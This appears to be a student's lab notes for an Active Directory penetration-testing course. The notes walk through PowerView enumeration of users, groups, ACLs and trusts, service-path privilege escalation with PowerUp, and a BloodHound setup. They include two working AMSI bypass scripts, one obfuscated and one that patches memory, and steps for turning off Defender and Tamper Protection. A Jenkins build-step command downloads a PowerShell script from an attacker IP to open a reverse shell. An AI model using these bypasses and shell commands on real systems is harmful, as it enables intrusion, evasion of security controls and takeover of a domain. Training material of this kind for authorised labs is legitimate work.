
# **Things to take note Of**

- Remember to turn off or add an exception to your student VM's firewall when you run a listener for a reverse shell.
- The `C:\` directory is exempted from Windows Defender, but AMSI may detect some tools when you load them.
- Use the following to Bypass AMSI after loading invisi-shell -:


```powershell
S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```
- 
- You would need to turn off Tamper Protection on the student VM after getting user shell (Check Google on how to do this)


# **Things to do once you have a User First**


- Start a PowerShell session using Invisi-Shell to avoid enhanced logging


```powershell
# do this on MS-DOS
C:\users\studentx> cd \AD\Tools

C:\users\studentx> C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat

# You should now have a powershell seesion
```

- Use the AMSI Bypass payload now
- Load `PowerView` in the PowerShell session.


```powershell
. C:\AD\Tools\PowerView.ps1
```



# **Enumeration**



### **Users**

```powershell
# Powerview (both are same command)
# One just shows you logoncount to detect decoy accounts

Get-DomainUser -Properties samaccountname,logonCount
Get-DomainUser | select -ExpandProperty samaccountname
```


### **Computers**


```powershell
# powerview
# shows username, equivalent to the whoami command
Get-DomainComputer | select Name

# shows domain network name, equivalent to the hostname command
Get-DomainComputer | select -ExpandProperty dnshostname
```




### **Domain Admins**


```powershell
# powerview
Get-DomainGroupMember -Identity "Domain Admins" -Recurse

# The most important piece of information from the output is (Note Down) -:
# MemeberName
# MemeberSID
```



### **Enterprise Admin**



```powershell
# powerview
Get-DomainGroupMember -Identity "Enterprise Admins" -Recurse

# If you don't get any output after the above command note that
# We need to query the root domain as Enterprise Admins group is present only in # the root of a forest.

Get-DomainGroupMember -Identity "Enterprise Admins" -Domain moneycorp.local

# Also note down MemberName and MemberSID
```




### **Shares**



```powershell
# powerview
Invoke-ShareFinder -Verbose

# See content of provided shares
# dir "\\dcorp-std520.dollarcorp.moneycorp.local\ADMIN$\"
dir "\\dnshostname\sharename"
```





### **List All Organizational Units**


```powershell
# powerview
Get-DomainOU

# Use the -Properties option to filter out just the name
Get-DomainOU -Properties Name
```


### **List all the computers in {the/An} {StudentMachines OU/OU}**


```powershell
# powerview
# Get OU name first
Get-DomainOU -Properties Name

# Then list all computers
(Get-DomainOU -Identity <OU_Name>).distinguishedname | %{Get-DomainComputer -SearchBase $_} | select name
```




### **List all the GPOs**



```powershell
# powerview
Get-DomainGPO
```




### **Enumerate GPO applied on the StudentMachines OU**


```powershell
# powerview
# Get OU name first
Get-DomainOU -Properties Name

# Grab identity on specific OU name
Get-DomainOU -Identity StudentMachines
# copy the "gplink" property where you have "LDAP//:cn={Copy-This}"

# Get GPO applied
Get-DomainGPO -Identity '{7478F170-6A0C-490C-B355-9E4618BC785D}'
```




### **ACL for the Users group**


```powershell
# powerview
Get-DomainObjectAcl -Identity "Users" -ResolveGUIDs -Verbose
```



### **ACL for the Domain Admins group**


```powershell
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs -Verbose
```



### **All modify rights/permissions for the student**


```powershell
# powerview
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "student505"}
```



### **ActiveDirectory Rights for RDPUsers group**



```powershell
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}
```



### **Get all domains in the current forest**



```powershell
Get-ForestDomain -verbose 

# The "Name:" property are the domain names
# Or just filter by Name
Get-ForestDomain -verbose | select Name
```


### **Map the trusts of All Domain**


```powershell
# Powerview
Get-DomainTrust

# Map the trust of a domain
Get-ForestDomain -verbose | select Name
Get-DomainTrust -Domain us.dollarcorp.moneycorp.local

# Ouput you should look out for -:
# SourceName
# TargetName
# TrustAttributes
# TrustDirection
```



### **Map external trust in The moneycorp.local forest**


```powershell
Get-ForestDomain | %{Get-DomainTrust -Domain $_.Name} | ?{$_.TrustAttributes -eq "FILTER_SIDS"}
```




### **Identify external trusts of the dollarcorp domain**



```powershell
Get-DomainTrust | ?{$_.TrustAttributes -eq "FILTER_SIDS"}
```


### **Trust Direction for the trust between dollarcorp.moneycorp.local and eurocorp.local**


```powershell
# If the "TrustDirection" output of the previous command is either bi-directional trust or one-way trust
# Then we can use the below command

Get-ForestDomain -Forest eurocorp.local | %{Get-DomainTrust -Domain $_.Name}
```



![](https://i.imgur.com/bIp4vE2.png)




# **Local Privilege Escalation**






### **Get services with unquoted paths and a space in their name {Exploit}**


- Cd to `C:\AD\Tools`
- Load Invisi-shell
- Load AMSI Bypass
- Load `Powerup.ps1` script


```powershell
. 'C:\Ad\Tools\PowerUp.ps1'
```


- Run the `Get-ServiceUnquoted` module to check for unquoted path


```powershell
$ Get-ServiceUnquoted -Verbose

# Note down the "ServiceName:" with unquoted paths
```


- Then abuse function for `Invoke-ServiceAbuse` and add our current domain user to the local Administrators group


```powershell
# -Name: Name of service to abuse
# -Username: Name of current user, Just run the whoami cmd
Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp\studentx' -Verbose  
```

We can see that the dcorp\studentx is a local administrator now. Just logoff and logon again and we have local administrator privileges!




### **Identify a machine in the domain where present user has local administrative access**



- Cd to `C:\AD\Tools`
- Load Invisi-shell
- Load AMSI Bypass
- Load `Find-PSRemotingLocalAdminAccess.ps1` script


```powershell
. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
```





- Fond local administrative access


```powershell
Find-PSRemotingLocalAdminAccess
```



![](https://i.imgur.com/6LJp7ia.png)



- We can the connect to the machines found using `winrs` or `Enter-PSSession`(Powershell Remoting)



```powershell
# winrs
winrs -r:dcorp-adminsrv cmd
set username
set computername

# powershell remoting
Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.loca
$env:username
```



![](https://i.imgur.com/8ZevFtw.png)




### **Jenkins**


- Navigate to the Jenkins instance `http://172.16.3.11:8080`
- Log in with default credentials, in this case `build:build`, or check google for **default Jenkins credentials**
- Turn off all windows firewall settings
- Start up `hfs.exe` (HTTP File Server) located under `C:\AD\Tools\`
- Navigate to `/job/Project0/configure` (If you get a `403` keep changing Project0 to Project1, Pro...2, ..........3 till you get a `200`)
- Scroll down to the option "**Build steps**" and on the drop down select/add "**Execute Windows Batch Command**" and enter-:

```powershell
powershell iex (iwr -UseBasicParsing http://ATTACKER-IP/Invoke-PowerShellTcp.ps1);power -Reverse -IPAddress ATTACKER-IP -Port 443

# Replace attacker IP with your IP Address, Run "ipconfig" to see it
```

- Start up your listener with `netcat.exe`

```powershell
C:\AD\Tools\netcat-win32-1.12\nc64.exe -lvp 443
```


- Hit **Apply** and then **Save** and on the left side bar, you should see a **Build Now** button, Click it.
- You should then see your reverse shell as `dcorp-ci`



![](https://i.imgur.com/Hf381f0.png)





### **Enumeration - Bloodhound**



**The Reason why this enumeration is coming after Local Privilege Escalation is because we need some administrative rights to run this type of enumeration**


#### **BloodHound New Setup**

- BloodHound uses **neo4j** graph database, so we need to setup that first.
- Go ahead open this location on MS-DOS


```powershell
cd C:\AD\Tools\neo4j-community-4.4.5-windows\neo4j-community-4.4.5\bin
```


- Install and start the neo4j service as follows:


```powershell
.\neo4j.bat install-service
.\neo4j.bat start
```


- Browse to the **neo4j** service on `localhost:7474/browser/` on your browser
- Enter the username: **neo4j** and password: **neo4j**.
- You also need to enter a new password. Let's use BloodHound as the new password.
- We also need to power on bloodhound, change directory to :


```powershell
cd C:\AD\Tools\BloodHound-win32-x64\BloodHound-win32-x64
.\BloodHound.exe
```



- Provide **neo4j** username and password we crated earlier


```
bolt://localhost:7687

Username: neo4j
Password:bloodhound 
```


- Now since we have local administrator privileges, go ahead and turn off antivirus (Both **Real time protection** and **Tamper Protection**) using GUI
- Open another powershell session with local administrative privileges and load **Invisi-shell**


```powershell
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat 
cd C:\AD\Tools\BloodHound-master\BloodHound-master\Collectors
```

- Bypass  **.NET AMSI Bypass** with the script below :

```powershell
$ZQCUW = @"
using System;
using System.Runtime.InteropServices;
public class ZQCUW {
[DllImport("kernel32")]
public static extern IntPtr GetProcAddress(IntPtr hModule, string
procName);
[DllImport("kernel32")]
public static extern IntPtr LoadLibrary(string name);
[DllImport("kernel32")]
public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr
dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@
Add-Type $ZQCUW
$BBWHVWQ =
[ZQCUW]::LoadLibrary("$([SYstem.Net.wEBUtIlITy]::HTmldecoDE('&#97;&#109;&#115
;&#105;&#46;&#100;&#108;&#108;'))")
$XPYMWR = [ZQCUW]::GetProcAddress($BBWHVWQ,
"$([systeM.neT.webUtility]::HtMldECoDE('&#65;&#109;&#115;&#105;&#83;&#99;&#97
;&#110;&#66;&#117;&#102;&#102;&#101;&#114;'))")
$p = 0
[ZQCUW]::VirtualProtect($XPYMWR, [uint32]5, 0x40, [ref]$p)
$TLML = "0xB8"
$PURX = "0x57"
$YNWL = "0x00"
$RTGX = "0x07"
$XVON = "0x80"
$WRUD = "0xC3"
$KTMJX = [Byte[]] ($TLML,$PURX,$YNWL,$RTGX,+$XVON,+$WRUD)
[System.Runtime.InteropServices.Marshal]::Copy($KTMJX, 0, $XPYMWR, 6)
```


- Start BloodHound collector, to gather data


```powershell
. .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -Verbose
```



- Navigate to the bloodhound collector directory on the GUI

```
Location:

C:\AD\Tools\BloodHound-master\BloodHound-master\Collectors
```



- You should see a zip file, drag and drop it to bloodhound UI


![](https://i.imgur.com/9Wd253Y.png)





#### **BloodHound Old Setup**






















```
![](https://i.imgur.com/LiMEZ8q.png)

In the lab we are using `betterSafetyKatz.exe` to forge tickets only and `safetyKatz.exe` to extract information

# **Learning Objective 1**
```


